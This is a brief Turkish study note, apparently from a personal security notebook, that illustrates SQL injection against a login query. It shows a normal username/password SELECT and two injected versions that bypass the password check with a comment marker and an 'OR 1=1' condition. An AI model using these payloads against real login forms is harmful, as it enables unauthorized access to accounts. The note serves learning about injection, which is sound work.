Boolen type injection a örnektir 
```sql title:SQL+Query
SELECT * FROM users WHERE username = 'kullanici' AND password = 'sifre';
```


```sql title:InjectedQuery
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'anything';
```

şeklinde bypass edebiliriz. 


> [!NOTE]
> gerçek hayatta çok karşına çıkan bir şey değildir


[[SQLİ]]